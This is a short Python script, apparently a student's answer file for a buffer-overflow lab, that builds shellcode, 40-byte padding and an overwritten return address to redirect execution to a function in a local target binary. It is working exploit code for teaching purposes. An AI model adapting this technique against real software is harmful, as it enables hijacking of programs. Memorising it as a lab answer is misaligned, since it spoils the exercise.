shellcode = b"\xbf\x72\x00\x00\x00"  # mov edi, 0x72
shellcode += b"\x68\x16\x12\x40\x00" # push 0x401216 (func1地址)
shellcode += b"\xc3"                 # ret

offset = 40  # 缓冲区到返回地址的偏移
padding_length = offset - len(shellcode)
padding = b"A" * padding_length

jmp_xs_addr = 0x401334
return_addr = jmp_xs_addr.to_bytes(8, 'little')

payload = shellcode + padding + return_addr

with open("ans3.txt", "wb") as f:
    f.write(payload)
